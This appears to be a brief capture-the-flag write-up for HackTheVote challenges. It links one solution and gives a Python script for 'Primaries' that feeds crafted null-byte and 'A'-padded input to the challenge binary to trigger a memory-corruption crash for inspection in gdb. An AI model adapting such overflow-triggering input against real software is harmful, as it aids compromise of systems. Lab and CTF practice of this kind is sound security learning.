# exploitation 100 - IRS
https://github.com/RPISEC/HackTheVote

# exploitation 150 - Primaries
segfaulting script
```python
import threading
from time import sleep
import subprocess

proc = subprocess.Popen('./primaries',
                        shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT)

def worker():
  while True:
      proc_read = proc.stdout.readline()
      if proc_read:
          print proc_read

t = threading.Thread(target=worker)
t.start()
raw_input()
# attach gdb, continue, examine regs, see the As
for i in range(1,100000):
  proc.stdin.write("\x00"*254)
  proc.stdin.write("\x00\x00\x00-\x00\x00-\x00\x00\x00\x00")
  proc.stdin.write("\x00"*246)
  proc.stdin.write("4\n")
  proc.stdin.write("A"*0x110)
```
